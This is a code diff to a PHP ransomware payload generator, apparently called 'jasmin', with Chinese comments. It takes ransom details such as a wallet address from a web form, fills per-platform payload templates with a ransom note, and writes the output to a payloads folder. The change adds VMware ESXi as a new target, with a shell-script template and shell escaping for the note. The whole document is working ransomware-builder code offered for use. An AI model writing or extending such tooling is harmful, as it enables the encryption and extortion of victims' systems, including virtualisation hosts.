@@ -22,7 +22,7 @@ $ransom = [
     'wallet'  => $_POST['ransom_wallet'] ?? '',
 ];
 
-$valid = ['win','linux','macos'];
+$valid = ['win','linux','macos','esxi'];
 if (!in_array($platform, $valid)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }
 
 $out_dir = __DIR__ . '/payloads';
@@ -30,8 +30,8 @@ if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);
 $ts = date('Ymd_His');
 $tok = bin2hex(random_bytes(4));
 
-$tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl'];
-$ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py'];
+$tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl','esxi'=>'esxi_payload.tpl'];
+$ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py','esxi'=>'.sh'];
 $tpl_path = __DIR__ . '/templates/' . $tpl_map[$platform];
 
 if (!file_exists($tpl_path)) { echo json_encode(['ok'=>false,'msg'=>'模板文件缺失']); exit; }
@@ -50,10 +50,18 @@ if (file_exists($pub_path)) {
 
 // 构建勒索信文本
 $note = build_ransom_note($ransom, $platform);
-$tpl = str_replace('{{RANSOM_NOTE}}', addcslashes($note, "'\"\\"), $tpl);
-// 也替换独立字段
-foreach ($ransom as $k=>$v) {
-    $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', addcslashes($v, "'\"\\"), $tpl);
+if ($platform === 'esxi') {
+    // sh单引号字符串: 用'\''转义单引号，换行保留
+    $note_esc = str_replace("'", "'\\''", $note);
+    $tpl = str_replace('{{RANSOM_NOTE}}', $note_esc, $tpl);
+    foreach ($ransom as $k=>$v) {
+        $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', str_replace("'","'\\''", $v), $tpl);
+    }
+} else {
+    $tpl = str_replace('{{RANSOM_NOTE}}', addcslashes($note, "'\"\\"), $tpl);
+    foreach ($ransom as $k=>$v) {
+        $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', addcslashes($v, "'\"\\"), $tpl);
+    }
 }
 
 $name = "jasmin_{$platform}_{$ts}_{$tok}" . $ext_map[$platform];
